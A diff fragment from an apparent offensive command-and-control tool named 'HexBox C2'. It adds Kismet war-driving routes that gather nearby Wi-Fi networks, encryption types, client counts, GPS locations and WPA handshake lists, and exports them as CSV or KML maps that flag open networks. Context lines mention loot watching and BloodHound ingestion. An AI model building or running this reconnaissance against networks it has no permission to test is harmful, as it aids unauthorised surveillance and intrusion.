+        "kismet", "-c", iface,
+        "--no-ncurses",
+        "--daemonize",
+    ])
+    _log(f"Kismet started (pid={pid}) on {iface}")
+    return jsonify(output=f"Kismet started (pid={pid}) on {iface} — dashboard at :2501")
+
+
+@app.route("/kismet/networks")
+def kismet_networks():
+    try:
+        # Fetch access points from Kismet API
+        data = _kismet_req(
+            "/devices/views/phydot11_accesspoints/devices.json?fields="
+            "kismet.device.base.macaddr,kismet.device.base.name,"
+            "kismet.device.base.signal/kismet.common.signal.last_signal,"
+            "kismet.device.base.channel,kismet.device.base.last_time,"
+            "dot11.device/dot11.device.last_beaconed_ssid_record/dot11.advertisedssid.ssid,"
+            "kismet.device.base.location/kismet.common.location.avg_loc,"
+            "dot11.device/dot11.device.num_associated_clients,"
+            "dot11.device/dot11.device.wpa_handshake_list",
+            timeout=15,
+        )
+    except Exception as e:
+        # Return cached data if Kismet unreachable
+        if _WD_NETWORKS_FILE.exists():
+            nets = json.loads(_WD_NETWORKS_FILE.read_text())
+            return jsonify(networks=nets, cached=True)
+        return jsonify(error=str(e), networks=[]), 502
+
+    networks = []
+    for dev in (data if isinstance(data, list) else []):
+        try:
+            bssid   = dev.get("kismet.device.base.macaddr", "?")
+            ssid    = (dev.get("dot11.device", {})
+                          .get("dot11.device.last_beaconed_ssid_record", {})
+                          .get("dot11.advertisedssid.ssid", ""))
+            signal  = (dev.get("kismet.device.base.signal", {})
+                          .get("kismet.common.signal.last_signal", -100))
+            channel = dev.get("kismet.device.base.channel", "?")
+            clients = (dev.get("dot11.device", {})
+                          .get("dot11.device.num_associated_clients", 0))
+            last_t  = dev.get("kismet.device.base.last_time", 0)
+            loc     = (dev.get("kismet.device.base.location", {})
+                          .get("kismet.common.location.avg_loc", {}))
+            lat = loc.get("kismet.common.location.lat")
+            lon = loc.get("kismet.common.location.lon")
+            alt = loc.get("kismet.common.location.alt")
+
+            # Infer encryption from SSID record if available
+            ssid_rec = (dev.get("dot11.device", {})
+                           .get("dot11.device.last_beaconed_ssid_record", {}))
+            crypt_set = ssid_rec.get("dot11.advertisedssid.crypt_set", 0)
+            if crypt_set == 0:
+                enc = "Open"
+            elif crypt_set & 0x400:
+                enc = "WPA3"
+            elif crypt_set & 0x100:
+                enc = "WPA2"
+            elif crypt_set & 0x20:
+                enc = "WPA"
+            else:
+                enc = "WEP"
+
+            networks.append({
+                "ssid":       ssid,
+                "bssid":      bssid,
+                "signal":     int(signal),
+                "channel":    str(channel),
+                "encryption": enc,
+                "clients":    int(clients),
+                "lat":        float(lat) if lat else None,
+                "lon":        float(lon) if lon else None,
+                "alt":        float(alt) if alt else None,
+                "last_seen":  datetime.fromtimestamp(last_t).strftime("%H:%M:%S") if last_t else "",
+            })
+        except Exception:
+            continue
+
+    # Persist for export/cache
+    _WD_NETWORKS_FILE.parent.mkdir(parents=True, exist_ok=True)
+    _WD_NETWORKS_FILE.write_text(json.dumps(networks, indent=2))
+    _log(f"Kismet: {len(networks)} networks fetched")
+    return jsonify(networks=networks)
+
+
+@app.route("/kismet/gps")
+def kismet_gps():
+    try:
+        data = _kismet_req("/location/location.json", timeout=5)
+        loc  = data.get("kismet.common.location.avg_loc", data)
+        return jsonify(
+            lat=loc.get("kismet.common.location.lat"),
+            lon=loc.get("kismet.common.location.lon"),
+            alt=loc.get("kismet.common.location.alt"),
+            fix=loc.get("kismet.common.location.fix", 0),
+        )
+    except Exception as e:
+        return jsonify(lat=None, lon=None, alt=None, fix=0, error=str(e))
+
+
+@app.route("/kismet/export")
+def kismet_export():
+    fmt = request.args.get("format", "csv")
+    nets: list[dict] = []
+    if _WD_NETWORKS_FILE.exists():
+        nets = json.loads(_WD_NETWORKS_FILE.read_text())
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    if fmt == "csv":
+        import io as _io
+        buf = _io.StringIO()
+        buf.write("SSID,BSSID,Signal,Channel,Encryption,Clients,Lat,Lon,LastSeen\n")
+        for n in nets:
+            buf.write(",".join([
+                f'"{n.get("ssid","")}"',
+                n.get("bssid",""),
+                str(n.get("signal","")),
+                str(n.get("channel","")),
+                n.get("encryption",""),
+                str(n.get("clients",0)),
+                str(n.get("lat","") or ""),
+                str(n.get("lon","") or ""),
+                f'"{n.get("last_seen","")}"',
+            ]) + "\n")
+        from io import BytesIO
+        return send_file(BytesIO(buf.getvalue().encode()),
+                         as_attachment=True,
+                         download_name=f"wardrive_{ts}.csv",
+                         mimetype="text/csv")
+
+    if fmt == "kml":
+        import xml.sax.saxutils as _xml
+        lines = ['<?xml version="1.0" encoding="UTF-8"?>',
+                 '<kml xmlns="http://www.opengis.net/kml/2.2"><Document>',
+                 f'<name>HexBox War-Drive {ts}</name>']
+        for n in nets:
+            if not n.get("lat") or not n.get("lon"):
+                continue
+            enc = _xml.escape(str(n.get("encryption", "?")))
+            color = "ff00ff00" if n.get("encryption") == "Open" else "ff0000ff"
+            ssid  = _xml.escape(str(n.get("ssid", "(hidden)")))
+            bssid = _xml.escape(str(n.get("bssid", "?")))
+            sig   = _xml.escape(str(n.get("signal", "?")))
+            ch    = _xml.escape(str(n.get("channel", "?")))
+            lines += [
+                "<Placemark>",
+                f"<name>{ssid}</name>",
+                f"<description>BSSID: {bssid} | {enc} | {sig} dBm | Ch {ch}</description>",
+                f"<Style><IconStyle><color>{color}</color></IconStyle></Style>",
+                f"<Point><coordinates>{n.get('lon')},{n.get('lat')},0</coordinates></Point>",
+                "</Placemark>",
+            ]
+        lines += ["</Document></kml>"]
+        from io import BytesIO
+        return send_file(BytesIO("\n".join(lines).encode()),
+                         as_attachment=True,
+                         download_name=f"wardrive_{ts}.kml",
+                         mimetype="application/vnd.google-earth.kml+xml")
+
+    return jsonify(error="unsupported format"), 400
+
+# ---------------------------------------------------------------------------
 # Routes — BloodHound auto-ingestion
 # ---------------------------------------------------------------------------
 
@@ -2399,7 +3282,7 @@ if __name__ == "__main__":
         t = threading.Thread(target=_loot_watcher, daemon=True)
         t.start()
 
-    print(f"[+] HexBox C2 (Phase 4) online → http://0.0.0.0:{PORT}")
+    print(f"[+] HexBox C2 (Phase 5) online → http://0.0.0.0:{PORT}")
     if not os.environ.get("HEXBOX_TOKEN") and not _HB.get("api_token"):
         print(f"[!] Access token (set HEXBOX_TOKEN env var to pin): {_TOKEN}")
     print(f"[!] SSH host-key verification is DISABLED (AutoAddPolicy) — see README for hardening")
